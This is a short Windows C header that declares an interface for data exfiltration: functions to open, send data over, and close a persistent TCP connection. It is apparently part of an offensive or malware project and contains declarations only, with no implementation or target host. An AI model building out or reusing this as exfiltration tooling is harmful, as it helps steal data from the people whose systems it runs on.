#ifndef EXFILTRATION_H
#define EXFILTRATION_H
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

// Initializes a persistent TCP connection for data exfiltration.
// Returns TRUE on success.
BOOL Exfiltration_Initialize();

// Sends data over the persistent TCP connection.
// Returns TRUE on success.
BOOL ExfiltrateData(const BYTE* pData, DWORD dwSize);

// Cleans up and closes the persistent TCP connection.
VOID Exfiltration_Cleanup();

#endif // EXFILTRATION_H
